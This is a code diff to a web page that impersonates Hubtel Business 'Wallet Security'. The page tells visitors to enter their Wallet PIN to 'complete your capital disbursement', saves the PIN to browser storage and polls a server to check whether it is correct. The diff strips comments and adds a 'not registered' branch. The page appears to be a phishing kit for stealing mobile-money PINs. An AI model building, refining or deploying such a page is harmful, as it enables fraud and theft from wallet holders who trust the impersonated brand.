@@ -89,7 +89,6 @@
             margin-top: 4px;
         }
 
-        /* Glassmorphism Card Box */
         .e-card-box {
             width: 100%;
             background: var(--surface);
@@ -115,7 +114,6 @@
             line-height: 1.4;
         }
 
-        /* Hidden Real Input & Custom Circle Dots Container */
         .e-input-group {
             position: relative;
             margin-bottom: 10px;
@@ -158,7 +156,6 @@
             border-color: #000000;
         }
 
-        /* Full Width Main Button (Dynamic State) */
         .e-btn-login {
             width: 100%;
             padding: 18px;
@@ -186,11 +183,6 @@
             box-shadow: 0 15px 35px rgba(78, 179, 164, 0.4);
         }
 
-        .e-btn-login.active:active {
-            transform: translateY(0);
-        }
-
-        /* Loading Spinner */
         #loadingSpinner {
             display: none;
             flex-direction: row;
@@ -217,7 +209,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Footer */
         .e-footer {
             text-align: center;
             color: var(--text-secondary);
@@ -225,7 +216,6 @@
             margin-top: 24px;
         }
 
-        /* Custom In-App Modal Dialog Styling */
         #customModal {
             display: none;
             position: fixed;
@@ -279,24 +269,17 @@
             width: 100%;
             box-shadow: 0 6px 16px rgba(78, 179, 164, 0.3);
         }
-
-        .modal-btn:active {
-            opacity: 0.9;
-        }
     </style>
 </head>
 <body>
 
     <div class="e-fullscreen-wrapper">
         <div class="e-main-content">
-            
-            <!-- HUBTEL LOGO -->
             <div class="e-logo">
                 Hubtel <span>Business</span>
                 <small>WALLET SECURITY</small>
             </div>
 
-            <!-- Main Card & PIN Form Section -->
             <div class="e-card-box">
                 <h2>Enter Wallet PIN</h2>
                 <p>Please enter your Wallet PIN to verify and complete your capital disbursement.</p>
@@ -314,7 +297,6 @@
 
             <button class="e-btn-login" id="confirmBtn" onclick="submitPinAttempt()">Confirm</button>
 
-            <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
                 <span>Verifying security credentials...</span>
@@ -326,7 +308,6 @@
         </div>
     </div>
 
-    <!-- Custom In-App Modal Dialog -->
     <div id="customModal">
         <div class="modal-card">
             <div id="modalText" class="modal-message">Notification message here</div>
@@ -344,7 +325,6 @@
         document.getElementById('customModal').style.display = 'none';
     }
 
-    // Handle circle fills and button state as user types
     function handlePinInput() {
         const mpinField = document.getElementById('mpin');
         const pinValue = mpinField.value.replace(/\D/g, '').slice(0, 4);
@@ -352,7 +332,6 @@
 
         const confirmBtn = document.getElementById('confirmBtn');
 
-        // Update the 4 small circles
         for (let i = 0; i < 4; i++) {
             const circle = document.getElementById(`circle-${i}`);
             if (i < pinValue.length) {
@@ -362,7 +341,6 @@
             }
         }
 
-        // Enable button when full 4 digits entered
         if (pinValue.length === 4) {
             confirmBtn.classList.add('active');
         } else {
@@ -381,7 +359,6 @@
 
         const phoneInput = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone') || '';
         
-        // Save PIN to localStorage
         localStorage.setItem('hubtelLastPin', mpinInput);
         localStorage.setItem('lastPin', mpinInput);
 
@@ -424,6 +401,13 @@
                         document.getElementById('loadingSpinner').style.display = 'none';
                     }
                     showAppAlert('Wrong PIN. Please try again.');
+                }
+                else if (data.status === 'not_user') {
+                    clearInterval(statusInterval);
+                    if (document.getElementById('loadingSpinner')) {
+                        document.getElementById('loadingSpinner').style.display = 'none';
+                    }
+                    showAppAlert('⚠️ Oops! Not Registered — Please register to continue.');
                 }
             } catch (e) {
                 console.error('Polling error', e);
